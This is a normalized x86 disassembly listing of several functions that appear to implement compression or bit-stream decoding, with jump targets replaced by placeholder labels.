not edx
shr ebx 0x1
and edx 0x1
inc ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
lea edx [ ebx + edx * 2 ]
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
mov edi [ ebp - 0x8 ]
mov ebx 0x500
cmp ebx edi
sbb ebx ebx
neg ebx
add edx ebx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
add edx ebx
cmp edx [ ebp - 0x10 ]
ja r-xdata
lea ebx [ edx + 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp edi ebx
ja r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
sub edi [ ebp - 0x8 ]
inc ebx
add edi [ ebp + 0x10 ]
mov dl [ edi ]
mov [ ebp - 0x8 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x8 ]
mov [ ebx + edi - 0x1 ] dl
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
inc [ ebp - 0x8 ]
mov [ ebx + edi ] dl
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx [ ebp - 0x10 ]
jae r-xdata
lea edx [ edx + ebx * 2 ]
mov [ ebp - 0xc ] edx
cmp esi [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx [ ebp - 0xc ]
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
test edx edx
je r-xdata
sub_405de0
push ebp
mov ebp esp
sub esp 0xc
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi eax
xor esi esi
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp + 0x8 ] edi
cmp edx edi
jb r-xdata
test cl 0x7f
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
mov edi edi
cmp eax edi
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
cmp esi 0x1000002
ja r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
cmp eax edi
jae r-xdata
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] esi
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
cmp esi eax
ja r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] esi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc eax
jmp r-xdata
movzx edx [ eax + ebx ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
cmp eax edi
jae r-xdata
mov edi [ ebp - 0xc ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
movzx ecx [ eax + ebx ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx edx [ eax + ebx ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
cmp eax edi
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea edi [ ecx + 0x1 ]
mov [ ebp - 0xc ] edi
test dl 0x7f
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
mov esi 0x500
cmp esi edi
sbb esi esi
neg esi
add edx esi
add edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x8 ]
ja r-xdata
mov edx 0x1
lea esp [ esp ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
cmp edi esi
ja r-xdata
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x4 ] edx
cmp edx eax
ja r-xdata
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] edx
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
movzx ecx [ eax + ebx ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_4060c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov esi [ esi ]
push edi
mov edi [ ebp + 0x8 ]
add edi eax
xor ecx ecx
xor ebx ebx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] esi
mov [ ebp + 0x8 ] edi
cmp esi edi
jb r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax ] ecx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea ebx [ ebx ]
cmp eax edi
jae r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea edi [ ecx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp edi 0x1000002
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx eax
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
add esi esi
test si si
jne r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff32
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
inc eax
jmp r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
cmp edi 0x2
jne r-xdata
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
add esi esi
mov [ ebp - 0x8 ] ecx
test si si
je r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + edi * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edx ]
add edi 0xfffffffd
shl edi 0x8
add ecx edi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
mov edi esi
shr edi 0x10
and edi 0x1
jmp r-xdata
mov edi esi
shr edi 0x10
and edi 0x1
jmp r-xdata
lea esi [ ecx + ecx ]
test si si
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ebx
cmp eax ecx
jne r-xdata
mov edi ecx
not edi
shr ecx 0x1
and edi 0x1
inc ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ecx
shr esi 0x10
and esi 0x1
lea edi [ esi + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
mov esi 0x500
cmp esi [ ebp - 0x8 ]
sbb esi esi
neg esi
add esi edi
add esi ebx
cmp esi [ ebp - 0x4 ]
ja r-xdata
mov edi 0x1
mov edi edi
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] ebx
ja r-xdata
mov ecx esi
shr ecx 0x10
and ecx 0x1
lea edi [ ecx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi [ eax + edx + 0x1 ]
movzx ecx [ eax + edx ]
add eax 0x2
shl esi 0x8
add esi ecx
lea esi [ esi + esi + 0x1 ]
lea ebx [ esi + 0x1 ]
cmp ebx eax
ja r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi [ ebp - 0x4 ]
jae r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + esi ]
test cx cx
jne r-xdata
mov esi ecx
shr esi 0x10
and esi 0x1
test esi esi
je r-xdata
movzx ecx [ eax + edx + 0x1 ]
movzx esi [ eax + edx ]
add eax 0x2
shl ecx 0x8
add ecx esi
lea ecx [ ecx + ecx + 0x1 ]
lea esi [ ecx + ecx ]
test si si
jne r-xdata
add edi 0x2
sub_4063d0
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
mov esi [ esi ]
mov [ ebp - 0xc ] esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp - 0xc ]
add esi edx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
mov [ ebp + 0x8 ] esi
cmp edi esi
jb r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
mov [ eax ] ecx
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov edi 0x1
lea ebx [ ebx ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
test esi esi
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
cmp esi edi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
pop edi
mov [ eax ] edx
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
cmp edi 0x1000002
ja r-xdata
lea edi [ esi + edi * 2 ]
mov [ ebp - 0x8 ] edi
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
cmp esi edx
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] esi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
inc edx
jmp r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
cmp edi 0x2
jne r-xdata
test ecx ecx
je r-xdata
test esi esi
jne r-xdata
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] esi
test ecx ecx
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
shr esi 0x1f
mov ecx 0x1f
lea edi [ esi + edi * 2 - 0x2 ]
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
lea edi [ esi + edi * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x8 ]
movzx edi [ edx + ebx ]
add esi 0xfffffffd
shl esi 0x8
add edi esi
inc edx
cmp edi 0xffffffff
je r-xdata
mov eax [ edx + ebx ]
mov ecx 0x1f
dec ecx
mov edi eax
shr edi cl
mov esi eax
add edx 0x4
shr esi 0x1f
and edi 0x1
jmp r-xdata
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
cmp edx eax
jne r-xdata
mov esi edi
not esi
shr edi 0x1
and esi 0x1
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
lea edi [ edi + esi * 2 ]
test edi edi
jne r-xdata
test ecx ecx
je r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop esi
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx + ebx ]
mov edi eax
add edx 0x4
mov ecx 0x1f
shr edi 0x1f
dec ecx
mov edi eax
shr edi cl
and edi 0x1
jmp r-xdata
mov esi 0x500
cmp esi [ ebp - 0x8 ]
sbb esi esi
neg esi
add edi esi
mov esi [ ebp - 0x4 ]
add esi edi
cmp esi [ ebp - 0xc ]
ja r-xdata
mov edi 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
pop edi
mov [ ecx ] eax
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] edi
ja r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] edi
pop edi
mov eax 0xffffff35
pop esi
mov esp ebp
pop ebp
retn
inc esi
mov [ ebp - 0x4 ] esi
cmp esi edx
ja r-xdata
cmp edi [ ebp - 0xc ]
jae r-xdata
lea edi [ esi + edi * 2 ]
cmp edx [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
pop edi
mov eax 0xffffff32
pop esi
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffff36
pop esi
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ edx + ebx ]
mov esi eax
add edx 0x4
mov ecx 0x1f
shr esi 0x1f
dec ecx
mov esi eax
shr esi cl
and esi 0x1
jmp r-xdata
test ecx ecx
je r-xdata
add edi 0x2
test esi esi
je r-xdata
sub_406700
push ebp
mov ebp esp
mov edx [ eax ]
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
sub edx ebx
mov [ eax + 0x58 ] edx
mov [ eax + 0x5c ] ecx
cmp ebx ecx
jbe r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x64 ]
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x4 ]
inc edx
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x70 ]
push esi
mov esi [ eax + 0x6c ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x74 ]
push edi
mov edi [ eax + 0x68 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x60 ]
sub edi esi
movzx eax [ edx + ecx + 0x1 ]
dec ebx
mov [ ebp + 0x8 ] ebx
movzx ebx [ edx + ecx ]
shl ebx 0x5
xor eax ebx
movzx ebx [ edx + ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ ebp - 0x4 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
mov ebx [ ebx + eax * 4 ]
mov [ edi + esi ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp - 0x8 ]
mov [ esi ] ebx
mov ebx [ ebp - 0xc ]
inc [ ebx + eax * 4 ]
movzx eax [ edx + ecx ]
mov ebx [ ebp - 0x10 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp + 0x8 ]
inc ecx
add esi 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
sub_4067b0
push ebp
mov ebp esp
sub esp 0x8
push edi
xor edi edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov [ esi ] 0x800000
mov ecx [ esi ]
mov [ esi + 0x8 ] 0x1
cmp ecx 0x800000
ja r-xdata
mov [ esi + 0x4 ] 0x800
mov eax 0xfffffffe
pop edi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
cmp eax 0x800
ja r-xdata
lea eax [ ecx + eax * 2 ]
cmp eax edi
ja r-xdata
push eax
call [ rwxdata ]
add esp 0x4
xor eax eax
jmp r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
push ebx
push 0x40000
mov [ esi + 0x60 ] eax
call [ rwxdata ]
mov ecx [ esi + 0x4 ]
add esp 0x4
add ecx [ esi ]
mov [ esi + 0x64 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
cmp ebx edi
jbe r-xdata
pop ebx
mov eax 0xfffffffd
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x64 ] edi
je r-xdata
cmp ebx edi
jbe r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
cmp [ esi + 0x68 ] edi
je r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
mov [ esi + 0x68 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
cmp [ esi + 0x6c ] edi
je r-xdata
push 0x40000
mov [ esi + 0x6c ] eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x70 ] eax
cmp [ esi + 0x60 ] edi
je r-xdata
cmp eax edi
je r-xdata
push 0x40000
call [ rwxdata ]
add esp 0x4
mov [ ebp - 0x4 ] eax
mov [ esi + 0x74 ] eax
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea ebx [ eax + ecx ]
mov [ esi + 0x14 ] eax
add eax ebx
mov [ esi + 0x10 ] 0x800
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x50 ] ebx
cmp eax 0xffffffff
jb r-xdata
mov eax [ esi + 0x60 ]
push 0x40000
mov [ esi + 0x58 ] ecx
mov ecx [ esi + 0x70 ]
add eax ebx
push edi
push ecx
mov [ esi + 0x54 ] eax
call sub_4105f0
mov edx [ ebp - 0x4 ]
push 0x40000
push 0xff
push edx
call sub_4105f0
mov [ esi + 0x44 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x5c ] edi
mov edi [ esi + 0x30 ]
mov ecx [ edi + 0x1c ]
mov eax [ edi + 0x24 ]
add esp 0x18
sub eax ecx
mov [ esi + 0x28 ] eax
je r-xdata
pop ebx
or eax 0xffffffff
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x44 ] ebx
jne r-xdata
mov edx [ esi + 0x4 ]
cmp eax edx
jbe r-xdata
mov eax [ esi ]
mov [ esi + 0x4c ] 0x0
test eax eax
jne r-xdata
mov [ esi + 0x44 ] 0x0
mov eax [ esi + 0x28 ]
push eax
mov eax [ esi + 0x60 ]
push ecx
push eax
call sub_411080
mov ecx [ esi + 0x28 ]
mov edx ecx
add esp 0xc
add [ edi + 0x1c ] ecx
mov [ esi + 0x44 ] edx
mov [ esi + 0x28 ] edx
sub ebx eax
mov [ esi + 0x4c ] ebx
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
neg eax
pop ebx
mov [ esi + 0x4c ] eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_4069d0
mov eax [ esi + 0x74 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x70 ]
mov [ esi + 0x74 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x6c ]
mov [ esi + 0x70 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x68 ]
mov [ esi + 0x6c ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x64 ]
mov [ esi + 0x68 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x60 ]
mov [ esi + 0x64 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x60 ] edi
pop edi
retn
push eax
call [ rwxdata ]
add esp 0x4
sub_406a50
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x1c ]
push esi
cmp edx [ ecx + 0x24 ]
jae r-xdata
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
mov esi edx
movzx edx [ esi ]
inc esi
mov [ ecx + 0x1c ] esi
test edx edx
jns r-xdata
mov ecx [ eax + 0x50 ]
mov esi 0x1
add [ eax + 0x44 ] esi
cmp [ eax + 0x44 ] ecx
jne r-xdata
dec ecx
mov [ eax + 0x28 ] ecx
jmp r-xdata
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x60 ]
mov [ ecx + esi ] dl
cmp ecx [ eax + 0x4 ]
jae r-xdata
add [ eax + 0x48 ] esi
cmp [ eax + 0x48 ] ecx
jne r-xdata
mov [ eax + 0x44 ] 0x0
mov esi [ eax + 0x54 ]
mov [ ecx + esi ] dl
add [ eax + 0x4c ] esi
pop esi
cmp [ eax + 0x4c ] ecx
jne r-xdata
mov [ eax + 0x48 ] 0x0
retn
mov [ eax + 0x4c ] 0x0
sub_406ad0
mov eax [ edx + 0x58 ]
test eax eax
jne r-xdata
dec eax
mov [ edx + 0x58 ] eax
mov ecx [ edx + 0x60 ]
movzx eax [ ecx + esi ]
add ecx esi
shl eax 0x5
push edi
movzx edi [ ecx + 0x1 ]
xor eax edi
movzx edi [ ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ edx + 0x74 ]
lea eax [ ecx + eax * 4 ]
pop edi
cmp [ eax ] esi
jne r-xdata
retn
mov [ eax ] 0xffffffff
retn
sub_406b30
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x4 ]
mov ecx [ edx + 0x48 ]
inc eax
push ebx
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x58 ]
push esi
mov esi [ edx + 0x60 ]
push edi
mov edi [ edx + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x8 ]
movzx eax [ esi + edi ]
movzx ebx [ esi + edi + 0x1 ]
shl eax 0x5
xor eax ebx
movzx ebx [ esi + edi + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
movzx ebx [ esi + edi ]
mov eax [ edx + 0x74 ]
cmp [ eax + ebx * 4 ] edi
jne r-xdata
mov eax [ edx + 0x28 ]
test eax eax
je r-xdata
movzx ebx [ eax ]
inc eax
mov [ edi + 0x1c ] eax
test ebx ebx
jns r-xdata
movzx edi [ esi + ecx ]
movzx eax [ esi + ecx + 0x1 ]
shl edi 0x5
xor eax edi
movzx edi [ esi + ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
